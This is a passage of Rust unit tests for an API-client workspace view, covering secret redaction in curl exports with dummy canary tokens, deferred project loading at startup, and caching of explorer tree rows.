            )
            .unwrap();
            assert!(!redacted.command.contains("canary_keychain_value_999"));
            assert!(!redacted.command.contains("raw_canary_token_123"));

            let full = curl::to_curl_export_with_secrets(
                &req,
                &v.resolved_variables.values,
                &v.resolved_variables.secret_names,
                false,
            )
            .unwrap();
            assert!(full.command.contains("canary_keychain_value_999"));
            assert!(full.command.contains("raw_canary_token_123"));

            view.update(cx, |view, cx| {
                view.sanitize_active_draft_credentials(window, cx);
            });
            let after = view.read(cx);
            assert!(after.draft_sensitive_findings.is_empty());
            assert_eq!(after.auth_kind, AuthKind::Bearer);
            assert_eq!(after.auth_token.read(cx).value(), "raw_canary_token_123");
        })
        .unwrap();
    }

    #[test]
    fn deferred_startup_opens_immediately_and_hydrates_projects_and_lazy_runtime() {
        run_view_test(check_deferred_startup);
    }

    fn check_deferred_startup() {
        let root = tempfile::tempdir().unwrap();
        let store = ProjectStore::at(root.path());
        seed_request(&store);

        let mut cx = TestAppContext::single();
        cx.update(gpui_kit::init);
        let (window, view) = cx
            .update(|cx| {
                gpui_kit::open_window(Default::default(), cx, |window, cx| {
                    cx.new(|cx| {
                        WorkspaceView::with_store_deferred(store.clone(), window, cx).unwrap()
                    })
                })
            })
            .unwrap();

        cx.update_window(window, |_, _, cx| {
            let v = view.read(cx);
            assert!(v.runtime.is_none());
            assert!(v.engine.is_none());
        })
        .unwrap();

        drain_persistence(&mut cx, &view);

        cx.update_window(window, |_, _, cx| {
            let v = view.read(cx);
            assert_eq!(v.current().name, "Test project");
            assert!(v.selected_id.is_some());
            assert_eq!(v.request_name.read(cx).value(), "Test request");
            assert_eq!(v.status, "Ready · local-first");
            assert!(v.runtime.is_none());
            assert!(v.engine.is_none());
        })
        .unwrap();
    }

    #[test]
    fn expand_initial_keeps_unrelated_folders_collapsed_and_caches_explorer_rows() {
        run_view_test(check_expand_initial_and_explorer_cache);
    }

    fn check_expand_initial_and_explorer_cache() {
        let root = tempfile::tempdir().unwrap();
        let store = ProjectStore::at(root.path());
        let mut project = store.create("Tree Project").unwrap();

        let mut f1 = Folder::new("First Folder");
        let f1_id = f1.id.clone();
        f1.requests
            .push(ApiRequest::new("GET", "First Req", "https://example.com/1"));

        let mut f2 = Folder::new("Sibling Folder");
        let f2_id = f2.id.clone();
        f2.requests.push(ApiRequest::new(
            "GET",
            "Second Req",
            "https://example.com/2",
        ));

        project.collections[0].folders.push(f1);
        project.collections[0].folders.push(f2);
        let coll_id = project.collections[0].id.clone();
        store.save(&project).unwrap();

        let mut cx = TestAppContext::single();
        cx.update(gpui_kit::init);
        let (window, view) = cx
            .update(|cx| {
                gpui_kit::open_window(Default::default(), cx, |window, cx| {
                    cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
                })
            })
            .unwrap();

        cx.update_window(window, |_, _, cx| {
            view.update(cx, |v, _| {
                assert!(v.expanded.contains(&coll_id));
                assert!(v.expanded.contains(&f1_id));
                assert!(!v.expanded.contains(&f2_id));

                let first = v.cached_explorer_rows();
                let second = v.cached_explorer_rows();
                assert!(std::sync::Arc::ptr_eq(&first, &second));

                v.expanded.insert(f2_id.clone());
                v.bump_explorer_epoch();
                let third = v.cached_explorer_rows();
                assert!(!std::sync::Arc::ptr_eq(&first, &third));
                assert!(third.len() > first.len());
            });
        })
        .unwrap();
    }
}
